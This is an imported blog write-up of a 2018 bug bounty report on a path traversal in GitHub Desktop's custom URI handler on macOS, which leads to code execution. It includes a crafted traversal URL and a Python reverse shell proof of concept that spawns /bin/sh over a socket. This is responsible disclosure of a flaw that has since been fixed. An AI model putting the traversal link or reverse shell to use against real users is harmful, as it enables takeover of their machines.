---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-04_github-desktop-rce-osx.md
original_filename: 2018-12-04_github-desktop-rce-osx.md
title: GitHub Desktop RCE (OSX)
category: documents
detected_topics:
- command-injection
- sso
- ssrf
tags:
- imported
- documents
- command-injection
- sso
- ssrf
language: en
raw_sha256: c94cb3b67550bf32f237dc793a6ce05e4ff410f89a19ed8f88fbddea2653e406
text_sha256: ffa2d2b576714ec725fb152fec0f837a0d64be2e29c8de9ded6adf84dc448895
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# GitHub Desktop RCE (OSX)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-04_github-desktop-rce-osx.md
- Source Type: markdown
- Detected Topics: command-injection, sso, ssrf
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `c94cb3b67550bf32f237dc793a6ce05e4ff410f89a19ed8f88fbddea2653e406`
- Text SHA256: `ffa2d2b576714ec725fb152fec0f837a0d64be2e29c8de9ded6adf84dc448895`


## Content

---
title: "GitHub Desktop RCE (OSX)"
page_title: "GitHub Desktop RCE (OSX) - 0xacb"
url: "https://pwning.re/2018/12/04/github-desktop-rce/"
final_url: "https://0xacb.com/2018/12/04/github-desktop-rce/"
authors: ["André Baptista (@0xacb)"]
programs: ["GitHub"]
bugs: ["RCE"]
publication_date: "2018-12-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5548
---

[0xacb](/) __

  * [Posts](/posts)
  * [Projects](/projects)
  * [About](/about)
  * Contact

# GitHub Desktop RCE (OSX)

## Bug Bounty Writeup

Posted by 0xacb on December 04, 2018 ·  6 mins read 

I was invited to H1-702 2018, a HackerOne live-hacking event in Las Vegas that [paid over $500k dollars in bounties](https://www.hackerone.com/blog/H1-702-2018-makes-history-over-500K-bounties-paid). One of the targets of this event was GitHub. I like to hack software I use everyday, because I already know lots of features in advance, so I felt GitHub would be a good target. I started playing with GitHub Desktop and found a way to achieve RCE in OSX. But, guess what? It was out of scope for the event! It’s also out of scope in the [normal program](https://hackerone.com/github), but you can read that “occasionally, exceptional reports are rewarded at our discretion on a case by case basis.”

* * *

## The Vulnerability

You can find the public list of bug bounty hunters and vulnerabilities here: <https://bounty.github.com/>  
I noticed that [@zhuowei](http://x.com/zhuowei) reported an RCE on GitHub Desktop last year:

[![](/files/posts/bug-bounty/github-desktop-rce1.png)](/files/posts/bug-bounty/github-desktop-rce1.png)

If something like this was reported previously, it’s probably safe to say that it is fixed. Maybe not in every OS? Well, you probably have seen this before:

[![](/files/posts/bug-bounty/github-desktop-rce2.png)](/files/posts/bug-bounty/github-desktop-rce2.png)

I started playing with `x-github-client://`, which is the URI scheme used by GitHub Desktop. One of the supported actions in this URL is `openRepo`, which automatically opens a given file in a repository. If this repo doesn’t exist, the app prompts the user to clone it and then opens the file. Example:

[x-github-client://openRepo/https://github.com/github/training-kit?branch=master&filepath=README.md](x-github-client://openRepo/https://github.com/github/training-kit?branch=master&filepath=README.md)

What if… we provide a `filepath` parameter like: "../../../../../../../../../../../Applications/Calculator.app" ?

Opening an URL like this would pop a calculator, so at this point it was possible to escape the repository directory, and arbitrary apps or files could be opened in the filesystem. However, a respository can contain an app for OSX, which is basically a directory with the Application Bundle. First, I thought that OSX would be able to detect that this app was downloaded from the Internet. Since the app is cloned through Git the OS will not prompt the user to confirm this action. What’s the root cause of the problem?

**app/src/main-process/main.ts**
  
  
  ...
  ipcMain.on(
  'show-item-in-folder',
  (event: Electron.IpcMessageEvent, { path }: { path: string }) => {
  ...
  
  if (stats.isDirectory()) {
  openDirectorySafe(path)
  }
  else {
  shell.showItemInFolder(path)
  }
  ...
  

**app/src/main-process/shell.ts**
  
  
  ...
  import { shell } from 'electron';
  
  export function openDirectorySafe(path: string) {
  if (__DARWIN__) {
  const directoryURL = Url.format({
  pathname: path,
  protocol: 'file:',
  slashes: true,
  })
  
  shell.openExternal(directoryURL)
  } else {
  shell.openItem(path)
  }
  }
  

In OSX, the directory path is converted to a `file:///` URL and then the Electron function `shell.openExternal()` opens the URL in the desktop’s default manner.

## The PoC

I built a simple reverse shell application for OSX with Pyinstaller and pushed it to my [github-desktop-poc](https://github.com/0xacb/github-desktop-poc/) repository:
  
  
  import socket,subprocess,os;
  
  os.system("open -a calculator.app")
  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect(("localhost",1337));
  os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);
  p=subprocess.call(["/bin/sh","-i"]);
  

If [github-desktop-poc](https://github.com/0xacb/github-desktop-poc/) wasn’t cloned previously, the user would need to click `clone`, but the specified file would be opened immediately after this action. Otherwise, no interaction required, as shown in the second part of the video PoC.

The attack scenario: An attacker can include an OSX app on his repository and distribute an evil link, for example in a `README.md` or in the page of a given project. He/She would be able to achieve remote code execution on the machines of GitHub Desktop users on OSX.

A one-click RCE has the following requirements:

  * The evil repository is already cloned
  * Trusting GitHub Desktop URLs - Always open these types of links in the associated app ✓  
  

## The Fix

[![](/files/posts/bug-bounty/github-desktop-rce3.png)](/files/posts/bug-bounty/github-desktop-rce3.png)

* * *

## Timeline

  * `2018/08/19` Reported to GitHub via HackerOne **#397045**
  * `2018/08/20` Triaged
  * `2018/08/25` Fixed - GitHub Desktop v1.3.4 released
  * `2018/08/27` Resolved and bounty awarded
  * `2018/08/27` H1-702 2018 Bonus: unlimited private repositories coupon ❤️

* * *

[← Previous Post](/2018/05/23/shopify-ssrf-to-rce/ "SSRF in Shopify Exchange to RCE") [Next Post →](/2019/03/15/steam-rce/ "RCE on Steam Client via buffer overflow in Server Info")

* * *

  * ____
  * [ ____ ](https://www.linkedin.com/in/0xacb)
  * [ ____ ](https://bsky.app/profile/0xacb.com)
  * [ ____ ](https://x.com/0xacb)
  * [ ____ ](https://github.com/0xacb)

Copyright © 0xacb 2026
